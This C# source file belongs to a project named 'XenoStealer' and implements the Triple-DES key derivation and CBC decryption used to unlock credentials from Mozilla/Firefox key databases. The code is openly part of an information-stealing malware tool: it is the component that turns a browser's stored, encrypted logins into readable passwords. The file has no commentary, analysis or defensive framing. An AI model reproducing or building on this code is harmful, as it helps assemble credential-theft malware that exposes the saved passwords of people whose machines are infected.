using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class TripleDES
    {
        public struct KeyVector 
        {
            public bool valid;
            public byte[] key;
            public byte[] vector;
            public KeyVector(byte[] _key, byte[] _vector, bool _valid) 
            { 
                key = _key;
                vector = _vector;
                valid = _valid;
            }
        }

        private static SHA1CryptoServiceProvider sha1 = new SHA1CryptoServiceProvider();

        public static KeyVector GetKeyVector(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt) 
        {
            if (entrySalt.Length > 20)
            {
                return new KeyVector(null, null, false);
            }

            if (masterPassword == null) 
            {
                masterPassword = new byte[0];
            }

            byte[] GlobalSaltMasterPassword = new byte[globalSalt.Length + masterPassword.Length];

            Array.Copy(globalSalt, 0, GlobalSaltMasterPassword, 0, globalSalt.Length);
            Array.Copy(masterPassword, 0, GlobalSaltMasterPassword, globalSalt.Length, masterPassword.Length);

            byte[] GlobalSaltMasterPasswordHash = sha1.ComputeHash(GlobalSaltMasterPassword);


            byte[] GlobalSaltMasterPasswordHashEntrySalt = new byte[GlobalSaltMasterPasswordHash.Length + entrySalt.Length];
            Array.Copy(GlobalSaltMasterPasswordHash, 0, GlobalSaltMasterPasswordHashEntrySalt, 0, GlobalSaltMasterPasswordHash.Length);
            Array.Copy(entrySalt, 0, GlobalSaltMasterPasswordHashEntrySalt, GlobalSaltMasterPasswordHash.Length, entrySalt.Length);

            byte[] GlobalSaltMasterPasswordHashEntrySaltHash = sha1.ComputeHash(GlobalSaltMasterPasswordHashEntrySalt);

            byte[] paddedEntrySalt = new byte[20];
            Array.Copy(entrySalt, 0, paddedEntrySalt, 0, entrySalt.Length);
            //for (var i = entrySalt.Length; i < 20; i++)
            //{
            //    pes[i] = 0;
            //}
            byte[] paddedEntrySaltEntrySalt = new byte[paddedEntrySalt.Length + entrySalt.Length];
            Array.Copy(paddedEntrySalt, 0, paddedEntrySaltEntrySalt, 0, paddedEntrySalt.Length);
            Array.Copy(entrySalt, 0, paddedEntrySaltEntrySalt, paddedEntrySalt.Length, entrySalt.Length);

            byte[] HmacPaddedEntrySaltEntrySaltHash;
            byte[] HmacPaddedEntrySaltHash;
            byte[] HmacHmacpaddedEntrySaltHashEntrySaltHash;

            using (HMACSHA1 hmac = new HMACSHA1(GlobalSaltMasterPasswordHashEntrySaltHash))
            {
                HmacPaddedEntrySaltEntrySaltHash = hmac.ComputeHash(paddedEntrySaltEntrySalt);
                HmacPaddedEntrySaltHash = hmac.ComputeHash(paddedEntrySalt);
                var HmacpaddedEntrySaltHashEntrySalt = new byte[HmacPaddedEntrySaltHash.Length + entrySalt.Length];
                Array.Copy(HmacPaddedEntrySaltHash, 0, HmacpaddedEntrySaltHashEntrySalt, 0, HmacPaddedEntrySaltHash.Length);
                Array.Copy(entrySalt, 0, HmacpaddedEntrySaltHashEntrySalt, HmacPaddedEntrySaltHash.Length, entrySalt.Length);
                HmacHmacpaddedEntrySaltHashEntrySaltHash = hmac.ComputeHash(HmacpaddedEntrySaltHashEntrySalt);
            }

            byte[] HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash = new byte[HmacPaddedEntrySaltEntrySaltHash.Length + HmacHmacpaddedEntrySaltHashEntrySaltHash.Length];
            Array.Copy(HmacPaddedEntrySaltEntrySaltHash, 0, HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash, 0, HmacPaddedEntrySaltEntrySaltHash.Length);
            Array.Copy(HmacHmacpaddedEntrySaltHashEntrySaltHash, 0, HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash, HmacPaddedEntrySaltEntrySaltHash.Length, HmacHmacpaddedEntrySaltHashEntrySaltHash.Length);


            byte[] Key = new byte[24];

            if (Key.Length > HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash.Length) 
            {
                return new KeyVector(null, null, false);
            }

            Array.Copy(HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash, Key, Key.Length);


            //for (var i = 0; i < Key.Length; i++)
            //{
            //    Key[i] = HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash[i];
            //}

            byte[] Vector = new byte[8];
            Array.Copy(HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash, HmacPaddedEntrySaltEntrySaltHashHmacHmacpaddedEntrySaltHashEntrySaltHash.Length - Vector.Length, Vector, 0, Vector.Length);


            return new KeyVector(Key, Vector, true);

        }

        public static byte[] DecryptByteDesCbc(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt, byte[] cipherText) 
        {
            KeyVector keyVector = GetKeyVector(globalSalt, masterPassword, entrySalt);

            if (!keyVector.valid) 
            {
                return null;
            }
            return DecryptByteDesCbc(keyVector.key, keyVector.vector, cipherText);
        }


        public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            return Encoding.UTF8.GetString(DecryptByteDesCbc(key, iv, input));
        }

        public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            var decrypted = new byte[512];

            using (var tdsAlg = new TripleDESCryptoServiceProvider())
            {
                tdsAlg.Key = key;
                tdsAlg.IV = iv;
                tdsAlg.Mode = CipherMode.CBC;
                tdsAlg.Padding = PaddingMode.None;

                var decryptFunc = tdsAlg.CreateDecryptor(tdsAlg.Key, tdsAlg.IV);

                using (var msDecrypt = new MemoryStream(input))
                {
                    using (var csDecrypt = new CryptoStream(msDecrypt, decryptFunc, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(decrypted, 0, decrypted.Length);
                    }
                }

            }

            return decrypted;
        }
    }
}
